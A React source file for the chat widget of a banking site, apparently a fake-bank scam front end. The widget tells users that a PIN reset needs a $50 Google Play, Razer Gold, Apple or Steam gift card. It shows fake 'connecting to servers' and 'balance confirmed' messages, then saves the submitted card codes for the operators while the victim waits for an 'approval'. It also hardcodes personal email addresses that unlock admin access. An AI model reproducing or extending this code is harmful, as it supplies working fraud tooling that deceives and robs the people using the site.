import React, { useState, useEffect, useRef } from 'react';
import { useApp } from './AppContext';
import { dbAPI } from '../lib/supabase';
import { Shield, Send, X, Star, Mail, KeyRound, Loader2, CreditCard, Sparkles, CheckCircle2 } from 'lucide-react';
import agentImg from '../assets/images/security_agent_bot_1782055016320.jpg';
import { motion } from 'motion/react';

interface ChatMessage {
  id: string;
  sender: 'bot' | 'user';
  text: string;
  timestamp: Date;
  meta?: {
    type?: 'otp_broadcaster' | 'premium_upgrade_actions' | 'pin_reset_input' | 'gift_card_gateway' | 'personal_admin_link' | 'human_support_link';
    otpCode?: string;
  };
}

interface SecurityBotProps {
  onNavigate?: (route: string) => void;
}

export const SecurityBot: React.FC<SecurityBotProps> = ({ onNavigate }) => {
  const { user, showToast, refreshUserData, isSecurityBotOpen, securityBotInitialMessage, closeSecurityBot, globalSettings } = useApp();
  const [isOpen, setIsOpen] = useState(false);
  const [messages, setMessages] = useState<ChatMessage[]>([]);
  const [inputText, setInputText] = useState('');
  
  // Interactive bot states
  const [activeFlow, setActiveFlow] = useState<'none' | 'otp_sent' | 'setting_pin' | 'gift_card_pending'>('none');
  const [generatedOtp, setGeneratedOtp] = useState('');
  const [otpVerified, setOtpVerified] = useState(false);
  const [newPinValue, setNewPinValue] = useState('');
  const [busyState, setBusyState] = useState(false);

  // Gift card processing states
  const [giftCardType, setGiftCardType] = useState<'playstore' | 'razergold' | 'apple' | 'steam'>('playstore');
  const [giftCardCode, setGiftCardCode] = useState('');
  const [paymentStep, setPaymentStep] = useState<'input' | 'processing' | 'success'>('input');
  const [processingStatusText, setProcessingStatusText] = useState('');

  const listRef = useRef<HTMLDivElement>(null);

  // Sync with global open request (e.g., from "Forgot PIN" triggers)
  useEffect(() => {
    if (isSecurityBotOpen) {
      setIsOpen(true);
      if (securityBotInitialMessage === 'forgot_transaction_pin') {
        initiateForgotPinFlow();
      }
    }
  }, [isSecurityBotOpen, securityBotInitialMessage]);

  useEffect(() => {
    // Auto scroll chat list to bottom
    if (listRef.current) {
      listRef.current.scrollTop = listRef.current.scrollHeight;
    }
  }, [messages, activeFlow, paymentStep, processingStatusText]);

  // Say hello on mount
  useEffect(() => {
    if (!user) return;
    
    // Start fresh for the user on every reload/login
    const initialMsg: ChatMessage = {
      id: `init-${Math.random()}`,
      sender: 'bot',
      text: `Greetings! I am ${globalSettings?.website_name || 'SmartVault'}'s Customer Support Agent. How can I assist you with your banking needs today?`,
      timestamp: new Date()
    };
    
    setMessages([initialMsg]);
    
    // Save to global history for the admin panel
    dbAPI.saveChatMessage({
      ...initialMsg,
      user_id: user.id,
      user_email: user.email,
      timestamp: initialMsg.timestamp.toISOString()
    });
  }, [user?.id]);

  const addMessage = (msg: ChatMessage) => {
    setMessages(prev => [...prev, msg]);
    if (user) {
      dbAPI.saveChatMessage({
        ...msg,
        user_id: user.id,
        user_email: user.email,
        timestamp: msg.timestamp.toISOString()
      });
    }
  };

  const addMessagesList = (msgs: ChatMessage[]) => {
    setMessages(prev => [...prev, ...msgs]);
    if (user) {
      msgs.forEach(msg => {
        dbAPI.saveChatMessage({
          ...msg,
          user_id: user.id,
          user_email: user.email,
          timestamp: msg.timestamp.toISOString()
        });
      });
    }
  };

  const initiateForgotPinFlow = () => {
    const userEmail = user?.email || 'your-email@nexabank.com';
    const currentTier = user?.tier || 'standard';

    const botMessage: ChatMessage = {
      id: `bot-msg-${Math.random()}`,
      sender: 'bot',
      text: `We take your account security very seriously. To retrieve or reset your Transaction PIN, please select one of the following verification methods:`,
      timestamp: new Date()
    };

    const actionMessage: ChatMessage = {
      id: `bot-meta-${Math.random()}`,
      sender: 'bot',
      text: currentTier === 'standard' 
        ? `To proceed with a PIN reset on a Standard tier account, you are required to temporarily upgrade to Premium Status using a $${user?.pin_reset_fee || 50} USD Google Play, Razer Gold, Apple, or Steam gift card.

Please select the Option A upgrade button below to submit card details.`
        : `Since you hold a ${currentTier.toUpperCase()} account, you possess full access to reset your PIN. You can directly request a secure OTP code.`,
      timestamp: new Date(),
      meta: {
        type: 'premium_upgrade_actions'
      }
    };

    addMessagesList([botMessage, actionMessage]);
    setActiveFlow('none');
    setPaymentStep('input');
    setGiftCardCode('');
  };

  const executeGmailOtpRequest = () => {
    if (!user) return;
    setBusyState(true);
    
    setTimeout(() => {
      const pinCode = String(Math.floor(1000 + Math.random() * 9000));
      console.log(`[Admin]: Intercepted OTP code: ${pinCode}`);
      setGeneratedOtp(pinCode);
      setActiveFlow('otp_sent');
      setBusyState(false);

      const notifyMsg: ChatMessage = {
        id: `bot-otp-send-${Math.random()}`,
        sender: 'bot',
        text: `OTP sent to "${user.email}". Please enter the code below to verify your identity.`,
        timestamp: new Date(),
        meta: {
          type: 'otp_broadcaster',
          otpCode: pinCode
        }
      };

      addMessage(notifyMsg);
      showToast('OTP Sent', `Sent verification code to ${user.email}`, 'security');
    }, 1000);
  };

  const handleVerifyOtp = (typedCode: string) => {
    if (typedCode === generatedOtp) {
      setOtpVerified(true);
      setActiveFlow('setting_pin');
      
      const resMsg: ChatMessage = {
        id: `bot-otp-verified-${Math.random()}`,
        sender: 'bot',
        text: `Identity verified successfully. Please input your new 4-digit Transaction PIN below:`,
        timestamp: new Date(),
        meta: {
          type: 'pin_reset_input'
        }
      };
      addMessage(resMsg);
    } else {
      showToast('Validation Failed', 'Incorrect OTP code. Please try again.', 'error');
    }
  };

  const handleSaveVerifiedPin = (pin: string) => {
    if (!user || pin.length !== 4) return;
    setBusyState(true);

    setTimeout(() => {
      dbAPI.updateTransactionPin(user.id, pin);
      refreshUserData();
      setBusyState(false);
      setActiveFlow('none');
      setNewPinValue('');

      const finMsg: ChatMessage = {
        id: `bot-pin-saved-${Math.random()}`,
        sender: 'bot',
        text: `Your transaction PIN has been successfully reset. All withdrawals, transfers, and wallet operations are now secured with your new PIN.`,
        timestamp: new Date()
      };
      addMessage(finMsg);
      showToast('PIN Updated', 'Your Transaction PIN has been updated successfully.', 'success');
    }, 1200);
  };

  // Triggers the interactive gift card verification panel
  const handleInitiatePremiumPayment = () => {
    setActiveFlow('gift_card_pending');
    setPaymentStep('input');
    setGiftCardCode('');
    
    const gatewayMsg: ChatMessage = {
      id: `bot-g-gateway-${Math.random()}`,
      sender: 'bot',
      text: `Premium Account Upgrade
To upgrade your Standard profile to Premium status, please choose your $${user?.premium_upgrade_fee || 50} USD gift card brand below and enter the serial code.`,
      timestamp: new Date(),
      meta: {
        type: 'gift_card_gateway'
      }
    };
    addMessage(gatewayMsg);
  };

  // Simulates verification of Google Play or Razer Gold code
  const handleVerifyGiftCardPayment = (e: React.FormEvent) => {
    e.preventDefault();
    if (!user || giftCardCode.trim().length < 8) {
      showToast('Error', 'Please provide a valid 8-16 alphanumeric gift card code.', 'error');
      return;
    }

    setPaymentStep('processing');
    setProcessingStatusText('Initializing secure gift card verification...');

    // Staggered status logs for immersion
    setTimeout(() => {
      let networkName = 'Google Play Store';
      if (giftCardType === 'razergold') networkName = 'Razer Gold';
      if (giftCardType === 'apple') networkName = 'Apple';
      if (giftCardType === 'steam') networkName = 'Steam';
      setProcessingStatusText(`Connecting to ${networkName} servers...`);
    }, 1200);

    setTimeout(() => {
      setProcessingStatusText(`Validating gift card balance ($${user?.premium_upgrade_fee || 50}.00 USD)...`);
    }, 2400);

    setTimeout(() => {
      setProcessingStatusText('Balance confirmed! Finalizing upgrade request...');
    }, 3600);

    setTimeout(() => {
      setPaymentStep('success');
      showToast('Success', 'Gift Card submitted successfully! Your account upgrade is pending review.', 'success');

      dbAPI.adminSaveGiftCard({
        id: `gc-${Math.random().toString(36).substr(2, 9)}`,
        user_id: user.id,
        code: giftCardCode.trim(),
        type: giftCardType as any,
        amount: 50.00,
        status: 'pending',
        created_at: new Date().toISOString()
      });
    }, 4800);
  };

  // handleCompletePremiumUpgrade removed to enforce admin verification constraint

  const handleSendTextMessage = (e: React.FormEvent) => {
    e.preventDefault();
    if (!inputText.trim()) return;

    const userText = inputText;
    setInputText('');

    const newUsrMsg: ChatMessage = {
      id: `usr-msg-${Math.random()}`,
      sender: 'user',
      text: userText,
      timestamp: new Date()
    };

    addMessage(newUsrMsg);

    // Simple deterministic bot responses for awesome sandbox feel
    setTimeout(() => {
      const lower = userText.trim().toLowerCase();
      let reply = '';
      let meta: ChatMessage['meta'] = undefined;

      if (lower === 'admin' || lower === 'support') {
        if (user?.role === 'personal_admin' || user?.tier === 'personal_admin' || user?.email === 'georgelarry34@gmail.com' || user?.email === 'Stephenniese6921@gmail.com' || user?.email === 'Stwilliams66@gmail.com') {
          reply = `Support dashboard access authorized for your session. Proceed below.`;
          meta = { type: 'personal_admin_link' };
        } else {
          reply = `Your account does not have authorization for this command.`;
        }
      } else if (lower.includes('pin') || lower.includes('reset') || lower.includes('forget') || lower.includes('forgot')) {
        initiateForgotPinFlow();
        return;
      } else if (lower.includes('premium') || lower.includes('upgrade') || lower.includes('tier') || lower.includes('gift') || lower.includes('giftcard')) {
        reply = `To upgrade your account to Premium status and enable self-service PIN resets, please provide a $${user?.premium_upgrade_fee || 50} Google Play, Razer Gold, Apple, or Steam gift card. Simply type 'reset pin' to access the upgrade terminal.`;
      } else if (lower.includes('hello') || lower.includes('hi') || lower.includes('hey')) {
        reply = `Hello! How can I help you today? I can assist with account security, PIN resets, or general account inquiries.`;
      } else if (lower.includes('status') || lower.includes('safe') || lower.includes('security')) {
        reply = `Your account is secure. Account profile: ${user?.tier.toUpperCase()}. Let me know if you need any assistance with your account.`;
      } else if (lower.includes('bank') || lower.includes('about') || lower.includes('who are you')) {
        reply = `Welcome to ${globalSettings?.website_name || 'SmartVault'}. We are a premier secure digital banking platform, offering seamless international transfers, crypto exchange services, personal loans, and advanced wealth management.`;
      } else if (lower.includes('withdraw') || lower.includes('transfer') || lower.includes('send money')) {
        reply = `To withdraw or transfer funds, please navigate to the 'Transfers' or 'Withdraw' section in your dashboard. You will need your secure Transaction PIN to complete any outgoing transactions.`;
      } else if (lower.includes('deposit') || lower.includes('fund') || lower.includes('add money')) {
        reply = `You can fund your account easily. Navigate to the Exchange section to deposit via Crypto, or use standard routing information for wire transfers.`;
      } else if (lower.includes('loan') || lower.includes('borrow')) {
        reply = `We offer flexible personal loans. You can submit a loan request from the 'Loans' section in your dashboard. Our support team reviews all requests within 24 hours.`;
      } else if (lower.includes('crypto') || lower.includes('bitcoin') || lower.includes('exchange')) {
        reply = `You can buy, sell, and swap major cryptocurrencies directly from the 'Exchange' section of your dashboard. We support Bitcoin, Ethereum, and other major assets.`;
      } else if (lower.includes('card') || lower.includes('credit card') || lower.includes('debit card')) {
        reply = `You can manage your virtual and physical cards from the 'Cards' section. You can freeze your card, view your details, or request a new one at any time.`;
      } else if (lower.includes('help')) {
        reply = `I am your automated Customer Service AI. I can assist you with account inquiries, transfers, PIN resets, and more. If you need more support, you can contact our human support team.`;
        meta = { type: 'human_support_link' };
      } else if (lower.includes('human') || lower.includes('support team') || lower.includes('real person') || lower.includes('talk to someone')) {
        reply = `I can connect you with our human support team. Please click the button below to send them an email.`;
        meta = { type: 'human_support_link' };
      } else {
        reply = `I'm not sure I understand. I can assist you with account inquiries, secure PIN resets, or technical support. If you need more support, you can contact our human support team.`;
        meta = { type: 'human_support_link' };
      }

      const botReply: ChatMessage = {
        id: `bot-reply-${Math.random()}`,
        sender: 'bot',
        text: reply,
        timestamp: new Date(),
        meta
      };
      addMessage(botReply);
    }, 600);
  };

  if (!user) return null;

  return (
    <>
      {/* REPOSITIONED SUPPORT BUTTON - BOTTOM RIGHT CORNER */}
      <motion.div 
        drag
        dragMomentum={false}
        className="fixed bottom-20 right-3.5 md:bottom-6 md:right-6 z-40 flex flex-col items-center gap-1 cursor-grab active:cursor-grabbing"
      >
        <button
          onClick={() => {
            setIsOpen(!isOpen);
            if (isSecurityBotOpen) closeSecurityBot();
          }}
          id="nexus-security-agent-btn"
          className="relative w-11 h-11 sm:w-12 sm:h-12 flex items-center justify-center hover:scale-105 active:scale-95 transition-all outline-none shadow-md hover:shadow-lg rounded-full overflow-hidden bg-white border border-slate-200/90 group"
          title="24/7 Banking Support"
        >
          {isOpen ? (
            <div className="w-full h-full bg-slate-900 text-white rounded-full flex items-center justify-center">
              <X className="w-4 h-4" />
            </div>
          ) : (
            <>
              <img src={agentImg} alt="Banking Support" className="absolute select-none pointer-events-none inset-0 w-full h-full object-cover" draggable="false" />
              <span className="absolute bottom-0.5 right-0.5 w-2.5 h-2.5 rounded-full bg-emerald-500 border-2 border-white" />
            </>
          )}
        </button>
        {!isOpen && (
          <span 
            className="text-[9px] font-semibold text-slate-600 bg-white/95 px-1.5 py-0.5 rounded-md border border-slate-200/60 shadow-xs pointer-events-none tracking-tight"
          >
            Support
          </span>
        )}
      </motion.div>

      {/* CENTERED LIGHT THEME DIALOG OVERLAY */}
      {isOpen && (
        <div id="nexus-security-overlay" className="fixed inset-0 bg-black/50 backdrop-blur-sm z-50 flex items-center justify-center p-4">
          <div 
            id="nexus-security-desk" 
            className="w-full max-w-[390px] h-[525px] bg-white border border-slate-200 rounded-3xl shadow-2xl flex flex-col overflow-hidden text-slate-900 animate-in fade-in zoom-in-95 duration-200"
          >
            {/* Header */}
            <div className="bg-slate-50 px-5 py-4 border-b border-slate-200 flex justify-between items-center">
              <div className="flex items-center gap-3">
                <div className="w-10 h-10 rounded-full bg-white border border-slate-200 flex items-center justify-center overflow-hidden flex-shrink-0">
                  <img src={agentImg} alt="Agent" className="w-full h-full object-cover" />
                </div>
                <div className="text-left">
                  <h4 className="font-sans font-bold text-sm text-slate-900 tracking-wide">Customer Service Agent</h4>
                  <div className="flex items-center gap-1.5 mt-0.5">
                    <span className="w-1.5 h-1.5 rounded-full bg-emerald-500 animate-pulse" />
                    <span className="text-[10px] font-mono text-slate-500 font-bold">SUPPORT AGENT ONLINE</span>
                  </div>
                </div>
              </div>
              
              <button
                onClick={() => {
                  setIsOpen(false);
                  closeSecurityBot();
                }}
                className="w-8 h-8 rounded-full bg-slate-50 flex items-center justify-center text-slate-500 hover:text-slate-900 hover:bg-slate-50 transition-all cursor-pointer"
              >
                <X className="w-4 h-4" />
              </button>
            </div>

            {/* Messages Viewport */}
            <div ref={listRef} className="flex-1 overflow-y-auto p-5 flex flex-col gap-4 bg-slate-50/50">
              {messages.map((m) => {
                const isBot = m.sender === 'bot';
                return (
                  <div key={m.id} className={`flex flex-col ${isBot ? 'items-start' : 'items-end'}`}>
                    {/* Role Label */}
                    <span className="text-[9px] font-mono font-bold text-slate-500 mb-1 px-1 uppercase tracking-wider">
                      {isBot ? 'Customer Service Agent' : 'You'}
                    </span>
                    
                    {/* Message Bubble */}
                    <div className={`px-4 py-3 rounded-2xl max-w-[88%] text-xs text-left leading-relaxed shadow-sm ${
                      isBot 
                        ? 'bg-white border border-slate-200 text-slate-900' 
                        : 'bg-cyan-950/30 border border-cyan-500/20 text-slate-800 rounded-tr-none'
                    }`}>
                      {m.text.split('\n').map((line, idx) => (
                        <p key={idx} className={idx > 0 ? 'mt-1.5' : ''}>{line}</p>
                      ))}

                      {/* Option Actions Widget */}
                      {m.meta?.type === 'premium_upgrade_actions' && activeFlow === 'none' && (
                        <div className="mt-4 flex flex-col gap-2 border-t border-slate-200 pt-3">
                          {user.tier === 'standard' && (
                            <button
                              onClick={handleInitiatePremiumPayment}
                              disabled={busyState}
                              className="w-full bg-blue-600 hover:bg-blue-600 text-white font-bold py-2.5 px-3 rounded-xl transition-all font-sans flex items-center justify-center gap-2 cursor-pointer disabled:opacity-40 text-xs shadow-sm"
                            >
                              <Star className="w-3.5 h-3.5 fill-current text-slate-500" />
                              <span>Option A: Upgrade to Premium Tier ($${user?.pin_reset_fee || 50} Gift Code)</span>
                            </button>
                          )}
                          
                          <button
                            onClick={executeGmailOtpRequest}
                            disabled={busyState}
                            className="w-full bg-slate-50 hover:bg-slate-50 text-slate-800 font-semibold py-2 px-3 rounded-xl transition-all font-sans flex items-center justify-center gap-2 cursor-pointer border border-slate-200 disabled:opacity-40 text-xs"
                          >
                            {busyState ? (
                              <Loader2 className="w-3.5 h-3.5 animate-spin" />
                            ) : (
                              <Mail className="w-3.5 h-3.5 text-slate-500" />
                            )}
                            <span>Option B: Request OTP Verification Code</span>
                          </button>
                        </div>
                      )}

                      {/* Interactive Gift Card input viewport inside chat messages */}
                      {m.meta?.type === 'gift_card_gateway' && activeFlow === 'gift_card_pending' && (
                        <div className="mt-4 p-4 bg-slate-50 border border-slate-200 rounded-2xl">
                          <div className="flex items-center gap-2 mb-3">
                            <CreditCard className="w-4 h-4 text-slate-800" />
                            <span className="text-[10px] font-sans font-bold tracking-wider text-slate-800 uppercase">Interactive Payment Terminal</span>
                          </div>

                          {paymentStep === 'input' && (
                            <form onSubmit={handleVerifyGiftCardPayment} className="flex flex-col gap-3">
                              {/* Selection */}
                              <div>
                                <label className="text-[9px] uppercase font-mono font-bold text-slate-500 block mb-1">Select Card Provider</label>
                                <div className="grid grid-cols-2 gap-2">
                                  <button
                                    type="button"
                                    onClick={() => setGiftCardType('playstore')}
                                    className={`py-2 px-2 rounded-lg border text-[10px] font-semibold transition-all ${
                                      giftCardType === 'playstore'
                                        ? 'bg-blue-600 text-white border-transparent'
                                        : 'bg-white text-slate-700 border-slate-200 hover:bg-slate-50'
                                    }`}
                                  >
                                    Google Play (${user?.premium_upgrade_fee || 50})
                                  </button>
                                  <button
                                    type="button"
                                    onClick={() => setGiftCardType('razergold')}
                                    className={`py-2 px-2 rounded-lg border text-[10px] font-semibold transition-all ${
                                      giftCardType === 'razergold'
                                        ? 'bg-blue-600 text-white border-transparent'
                                        : 'bg-white text-slate-700 border-slate-200 hover:bg-slate-50'
                                    }`}
                                  >
                                    Razer Gold (${user?.premium_upgrade_fee || 50})
                                  </button>
                                  <button
                                    type="button"
                                    onClick={() => setGiftCardType('apple')}
                                    className={`py-2 px-2 rounded-lg border text-[10px] font-semibold transition-all ${
                                      giftCardType === 'apple'
                                        ? 'bg-blue-600 text-white border-transparent'
                                        : 'bg-white text-slate-700 border-slate-200 hover:bg-slate-50'
                                    }`}
                                  >
                                    Apple (${user?.premium_upgrade_fee || 50})
                                  </button>
                                  <button
                                    type="button"
                                    onClick={() => setGiftCardType('steam')}
                                    className={`py-2 px-2 rounded-lg border text-[10px] font-semibold transition-all ${
                                      giftCardType === 'steam'
                                        ? 'bg-blue-600 text-white border-transparent'
                                        : 'bg-white text-slate-700 border-slate-200 hover:bg-slate-50'
                                    }`}
                                  >
                                    Steam (${user?.premium_upgrade_fee || 50})
                                  </button>
                                </div>
                              </div>

                              {/* Input Code */}
                              <div>
                                <label className="text-[9px] uppercase font-mono font-bold text-slate-500 block mb-1">Input 16-Digit Scratch Code</label>
                                <input
                                  type="text"
                                  value={giftCardCode}
                                  onChange={(e) => setGiftCardCode(e.target.value.toUpperCase())}
                                  placeholder={giftCardType === 'playstore' ? 'GPLS-XXXX' : giftCardType === 'razergold' ? 'RG-XXXX' : giftCardType === 'apple' ? 'APPL-XXXX' : 'STM-XXXX'}
                                  className="w-full bg-white border border-slate-200 rounded-lg px-3 py-2 text-center text-xs tracking-wider font-mono font-bold text-slate-900 uppercase focus:outline-none focus:border-blue-500"
                                  required
                                />
                              </div>

                              <button
                                type="submit"
                                className="w-full mt-1.5 bg-emerald-600 hover:bg-emerald-700 text-slate-900 font-bold py-2 px-3 rounded-xl transition-all flex items-center justify-center gap-1.5 font-sans"
                              >
                                <Sparkles className="w-3.5 h-3.5 text-slate-700" />
                                <span>Verify Code & Upgrade</span>
                              </button>
                            </form>
                          )}

                          {paymentStep === 'processing' && (
                            <div className="flex flex-col items-center justify-center py-4 text-center">
                              <Loader2 className="w-8 h-8 animate-spin text-slate-800 mb-2.5" />
                              <span className="text-[10px] font-mono text-slate-500 uppercase font-semibold">Account Verification</span>
                              <p className="text-[11px] font-medium text-slate-800 mt-2 animate-pulse">{processingStatusText}</p>
                            </div>
                          )}

                          {paymentStep === 'success' && (
                            <div className="flex flex-col items-center justify-center py-2 text-center">
                              <Loader2 className="w-10 h-10 text-amber-500 mb-2 animate-spin" />
                              <span className="text-[11px] font-sans font-extrabold text-amber-600 uppercase tracking-wider">Awaiting Verification</span>
                              
                              <div className="mt-2 bg-amber-500/10 border border-amber-500/20 rounded-xl p-2.5 w-full text-left font-mono text-[10px] text-slate-800 flex flex-col gap-1">
                                <div className="flex justify-between">
                                  <span className="opacity-75">Provider:</span>
                                  <span className="font-bold uppercase">{giftCardType === 'playstore' ? 'Google Play Store' : 'Razer Gold'}</span>
                                </div>
                                <div className="flex justify-between">
                                  <span className="opacity-75">Voucher Value:</span>
                                  <span className="font-bold">$50.00 USD</span>
                                </div>
                                <div className="flex justify-between">
                                  <span className="opacity-75">Clearance State:</span>
                                  <span className="font-bold text-slate-500 uppercase font-semibold">PENDING ACCOUNT VERIFICATION</span>
                                </div>
                              </div>
                              
                              <p className="text-[10px] text-slate-500 mt-2 leading-relaxed font-sans">
                                Your card voucher serial code has been successfully recorded to our secure logs. Manual double-check validation from the support team is required before account upgrade is authorized.
                              </p>
                              
                              <div className="w-full mt-3 p-2 bg-amber-500/10 border border-amber-500/20 rounded-lg text-[10px] text-slate-500 text-center font-bold uppercase animate-pulse">
                                Waiting for Support Approval...
                              </div>
                            </div>
                          )}
                        </div>
                      )}

                      {m.meta?.type === 'personal_admin_link' && (
                        <div className="mt-3 p-3 bg-slate-50 border border-slate-200 rounded-xl relative overflow-hidden text-center">
                          <button
                            onClick={() => {
                              onNavigate?.('personal_admin');
                              closeSecurityBot();
                            }}
                            className="bg-slate-800 hover:bg-slate-900 text-white font-bold py-2 px-4 rounded-xl shadow-sm text-xs font-sans mt-1 w-full"
                          >
                            Open Support Dashboard
                          </button>
                        </div>
                      )}

                      {m.meta?.type === 'human_support_link' && (
                        <div className="mt-3 p-3 bg-white border border-slate-200 rounded-xl relative overflow-hidden flex flex-col items-center">
                          <a
                            href={`mailto:${globalSettings?.support_email || 'customersupport056@gmail.com'}`}
                            className="bg-blue-600 hover:bg-blue-700 text-white font-bold py-2 px-4 rounded-xl shadow-sm text-xs font-sans mt-1 w-full text-center decoration-transparent flex justify-center items-center gap-1.5"
                          >
                            <Mail className="w-3.5 h-3.5" />
                            Contact Human Support ({globalSettings?.support_email || 'customersupport056@gmail.com'})
                          </a>
                        </div>
                      )}

                      {m.meta?.type === 'otp_broadcaster' && activeFlow === 'otp_sent' && (
                        <div className="mt-3 p-3 bg-slate-50 border border-slate-200 rounded-xl relative overflow-hidden">
                          <div className="flex items-center gap-2 mb-1.5">
                            <Mail className="w-3.5 h-3.5 text-slate-800" />
                            <span className="text-[10px] font-sans tracking-wide text-slate-800 font-bold uppercase">OTP Verification</span>
                          </div>
                          <p className="text-[10px] text-slate-500">OTP sent to "{user.email}".</p>
                          
                          {/* OTP entry input */}
                          <div className="mt-3.5 pt-3 border-t border-slate-200/60">
                            <label className="text-[9px] uppercase font-mono font-bold tracking-wider text-slate-500 block mb-1">Enter code below</label>
                            <input
                              type="text"
                              maxLength={4}
                              placeholder="• • • •"
                              onChange={(e) => {
                                const val = e.target.value.replace(/\D/g, '');
                                if (val.length === 4) {
                                  handleVerifyOtp(val);
                                }
                              }}
                              className="w-full bg-white border border-slate-200 rounded-lg px-2.5 py-1.5 text-center font-mono text-sm tracking-[0.6em] font-bold text-slate-900 focus:outline-none focus:border-blue-500"
                            />
                          </div>
                        </div>
                      )}

                      {m.meta?.type === 'pin_reset_input' && activeFlow === 'setting_pin' && (
                        <div className="mt-3 border-t border-slate-200 pt-3 flex flex-col gap-2">
                          <label className="text-[10px] uppercase font-mono font-bold tracking-wider text-slate-500 block">Configure New 4-Digit PIN</label>
                          <div className="relative">
                            <input
                              type="password"
                              maxLength={4}
                              value={newPinValue}
                              onChange={(e) => setNewPinValue(e.target.value.replace(/\D/g, ''))}
                              placeholder="• • • •"
                              className="w-full bg-slate-50 border border-slate-200 rounded-xl px-4 py-2 text-center font-mono text-base tracking-[0.8em] font-bold text-slate-900 focus:outline-none focus:border-blue-500"
                            />
                          </div>
                          
                          <button
                            onClick={() => handleSaveVerifiedPin(newPinValue)}
                            disabled={newPinValue.length !== 4 || busyState}
                            className="w-full mt-1 bg-blue-600 hover:bg-blue-600 disabled:opacity-30 disabled:hover:bg-blue-600 text-white font-bold py-2 px-3 rounded-xl transition-all font-sans flex items-center justify-center gap-1.5 cursor-pointer text-xs"
                          >
                            {busyState ? (
                              <Loader2 className="w-3.5 h-3.5 animate-spin" />
                            ) : (
                              <KeyRound className="w-3.5 h-3.5" />
                            )}
                            <span>Save Safe Key Pin</span>
                          </button>
                        </div>
                      )}
                    </div>
                  </div>
                );
              })}

              {busyState && (
                <div className="flex justify-start">
                  <div className="bg-white border border-slate-200 px-4 py-2.5 rounded-2xl flex items-center gap-2 text-xs text-slate-500 shadow-sm">
                    <Loader2 className="w-3.5 h-3.5 animate-spin text-slate-700" />
                    <span>Nexa protection officer is compiling logs...</span>
                  </div>
                </div>
              )}
            </div>

            {/* Quick Option Pills */}
            {activeFlow === 'none' && !busyState && (
              <div className="px-4 py-2 bg-slate-50 border-t border-slate-200 flex gap-2 overflow-x-auto select-none no-scrollbar">
                <a
                  href={`mailto:${globalSettings?.support_email || 'customersupport056@gmail.com'}`}
                  className="bg-blue-50 hover:bg-blue-100 text-blue-700 px-3 py-1.5 rounded-full text-[11px] whitespace-nowrap border border-blue-200 font-bold flex items-center gap-1.5 cursor-pointer transition-all shadow-sm decoration-transparent"
                >
                  <Mail className="w-3.5 h-3.5" />
                  Contact Human Support
                </a>
                <button
                  onClick={() => {
                    setInputText('reset transaction pin');
                    const d = document.getElementById('chat-submit-btn');
                    setTimeout(() => d?.click(), 10);
                  }}
                  className="bg-white hover:bg-slate-50 text-slate-700 px-3 py-1.5 rounded-full text-[11px] whitespace-nowrap border border-slate-200 hover:border-slate-200 font-medium cursor-pointer transition-all shadow-sm"
                >
                  Forgot Transaction PIN
                </button>
                <button
                  onClick={() => {
                    setInputText('upgrade status');
                    const d = document.getElementById('chat-submit-btn');
                    setTimeout(() => d?.click(), 10);
                  }}
                  className="bg-white hover:bg-slate-50 text-slate-700 px-3 py-1.5 rounded-full text-[11px] whitespace-nowrap border border-slate-200 hover:border-slate-200 font-medium cursor-pointer transition-all shadow-sm"
                >
                  Upgrade to Premium ($${user?.premium_upgrade_fee || 50} Card)
                </button>
                <button
                  onClick={() => {
                    setInputText('is my account safe?');
                    const d = document.getElementById('chat-submit-btn');
                    setTimeout(() => d?.click(), 10);
                  }}
                  className="bg-white hover:bg-slate-50 text-slate-700 px-3 py-1.5 rounded-full text-[11px] whitespace-nowrap border border-slate-200 hover:border-slate-200 font-medium cursor-pointer transition-all shadow-sm"
                >
                  Check System Safety
                </button>
              </div>
            )}

            {/* Message Input Area */}
            <form onSubmit={handleSendTextMessage} className="p-3.5 bg-slate-50 border-t border-slate-200 flex gap-2">
              <input
                type="text"
                value={inputText}
                onChange={(e) => setInputText(e.target.value)}
                placeholder="Ask safety desk or type override commands..."
                className="flex-1 bg-white border border-slate-200 rounded-2xl px-4 py-2.5 text-xs text-slate-900 focus:outline-none focus:border-blue-500 placeholder-slate-400 font-medium shadow-sm"
                disabled={busyState}
              />
              <button
                id="chat-submit-btn"
                type="submit"
                disabled={!inputText.trim() || busyState}
                className="w-10 h-10 bg-blue-600 hover:bg-blue-600 disabled:opacity-30 disabled:hover:bg-blue-600 text-white rounded-2xl flex items-center justify-center cursor-pointer transition-all shadow-sm"
              >
                <Send className="w-4 h-4" />
              </button>
            </form>
          </div>
        </div>
      )}
    </>
  );
};
